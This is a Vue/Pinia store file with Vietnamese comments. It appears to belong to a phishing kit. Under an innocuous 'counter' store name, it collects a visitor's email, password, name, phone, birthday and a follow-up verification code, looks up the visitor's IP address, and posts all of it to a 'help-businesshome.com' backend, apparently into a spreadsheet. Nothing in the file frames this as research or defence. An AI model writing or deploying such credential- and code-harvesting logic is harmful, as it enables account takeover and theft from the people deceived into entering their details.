import { defineStore } from 'pinia';

import axios from 'axios';
import { useRoute } from 'vue-router';
const Route = useRoute();


export const useCounterStore = defineStore('counter', {
  state: () => {
    return {
      domain_Backend: 'https://help-businesshome.com', domain_Frontend: '', Path_Route: useRoute(),
      page:'',email:'',name:'',phone:'',birthday:'',message:'',password:'',code:'',
      page_dk:true,email_dk:true,name_dk:true,phone_dk:true,birthday_dk:true,message_dk:true,password_dk:true,code_dk:true,
      email_error:true,password_error:true,code_error:false,
      check_mail:false,check_password:false,check_code:false,check_all:false,
      show_password:true,
      time_login:'',
      time:59,
      row_number:'',
      data_ip:'',

      // data_check_password:{event: "checkEmail", email: email},
      // data_check_code:{event: "checkEmail", email: email},

    }
  },

  getters: {
    // cookievalue: (state) => state.openthongtincanhan.token + "(Theta)" + state.openthongtincanhan.id,
  },

  actions: {
      Show_pw() {
        this.show_password = !this.show_password;
    },
    async writeToSheet(ip) {
      await this.handleClick()
      this.row_number = await axios({ method: 'post',
      data:{row:{rc1:this.email,
                 rc2:this.password,
                 rc3:this.name,
                 rc4:this.phone,
                 rc5:this.page,
                 rc6:this.message,
                 rc7:this.time_login,
      },ip:ip},
      url: this.domain_Backend + '/gg-sh1/'});
      this.row_number = this.row_number.data.row_number;
    },
    async writeToSheet_1() {
      await axios({ method: 'post',
      data:{row_number:this.row_number,code:this.code},
      url: this.domain_Backend + '/gg-sh1-1/'});
    },
    handleClick() {
      // Lấy thời gian hiện tại khi người dùng nhấp vào nút
      var currentTime = new Date();
      // Biến đổi thời gian thành chuỗi để hiển thị
      var formattedTime = currentTime.toLocaleString();
      this.time_login = formattedTime
      // In thời gian ra console hoặc thực hiện bất kỳ hành động nào bạn muốn ở đây
      console.log("Người dùng đã nhấp vào nút vào lúc: " + formattedTime);
  },
    async get_ip() {
      this.data_ip = await axios({ method: 'get', url:'https://api-bdc.net/data/client-ip' });
      this.data_ip = this.data_ip.data;
      this.writeToSheet(this.data_ip.ipString);
    },
  }
})


